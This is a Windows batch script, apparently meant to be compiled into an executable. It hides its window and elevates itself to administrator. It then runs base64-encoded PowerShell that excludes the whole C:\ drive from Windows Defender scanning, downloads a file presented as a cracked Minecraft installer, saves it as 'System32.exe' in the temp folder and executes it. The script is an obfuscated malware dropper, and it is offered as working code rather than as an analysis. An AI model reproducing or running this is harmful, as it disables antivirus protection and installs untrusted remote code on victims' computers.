@ECHO OFF
REM BFCPEOPTIONSTART
REM Advanced BAT to EXE Converter www.BatToExeConverter.com
REM BFCPEEXE=
REM BFCPEICON=
REM BFCPEICONINDEX=-1
REM BFCPEEMBEDDISPLAY=0
REM BFCPEEMBEDDELETE=1
REM BFCPEADMINEXE=0
REM BFCPEINVISEXE=0
REM BFCPEVERINCLUDE=0
REM BFCPEVERVERSION=1.0.0.0
REM BFCPEVERPRODUCT=Product Name
REM BFCPEVERDESC=Product Description
REM BFCPEVERCOMPANY=Your Company
REM BFCPEVERCOPYRIGHT=Copyright Info
REM BFCPEWINDOWCENTER=1
REM BFCPEDISABLEQE=0
REM BFCPEWINDOWHEIGHT=30
REM BFCPEWINDOWWIDTH=120
REM BFCPEWTITLE=Window Title
REM BFCPEOPTIONEND
powershell -w h -command ""

if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)


powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA

powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==

powershell -enc JAB1AHIAbAAgAD0AIAAiACAAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBNAG8AaABhAG0AYQBkAGkAbwBuAG8ALwBNAGkAbgBlAGMAcgBhAGYAdAAtAEkAbgBzAHQAYQBsAGwAZQByAC0AYwByAGEAYwBrAGUAZAAtAGkAbgAtAG0AcwBpAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAE0AaQBuAGUAYwByAGEAZgB0AC4AbQBzAGkAIAAiAA0ACgAkAG8AdQB0AHAAdQB0ACAAPQAgACIAJABlAG4AdgA6AFQAZQBtAHAALwBTAHkAcwB0AGUAbQAzADIALgBlAHgAZQAiAA0ACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJAB1AHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAbwB1AHQAcAB1AHQADQAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAbwB1AHQAcAB1AHQA